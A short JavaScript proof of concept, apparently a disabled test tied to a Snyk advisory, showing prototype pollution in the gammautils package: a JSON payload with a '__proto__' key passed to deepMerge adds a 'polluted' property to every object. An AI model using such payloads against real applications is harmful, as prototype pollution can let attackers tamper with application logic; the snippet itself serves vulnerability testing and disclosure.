// //https://snyk.io/vuln/SNYK-JS-GAMMAUTILS-598670
// test("prototype pollution in gammautils", () => {
console.log({}.polluted);

  const gammautils = require("gammautils");
  var payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  gammautils.object.deepMerge({}, payload);

console.log({}.polluted);
// });
